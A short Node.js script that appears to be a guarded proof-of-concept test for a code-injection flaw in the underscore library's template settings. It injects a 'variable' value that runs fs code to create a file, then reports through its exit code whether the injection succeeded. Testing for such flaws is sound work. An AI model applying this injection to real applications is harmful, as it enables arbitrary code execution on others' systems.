if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const _ = require("underscore");
const path = "./underscore";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
_.templateSettings.variable =
	"a = import(`fs`).then((x)=>x.writeFileSync(`underscore`,``))";
const t = _.template("")();
setTimeout(() => {
	file_exist = fs.existsSync(path);
	fs.unlink(path, function (err) {});
	console.log("b", file_exist);

	if (file_exist) {
		process.exit(0);
	} else {
		process.exit(82);
	}
}, 1);
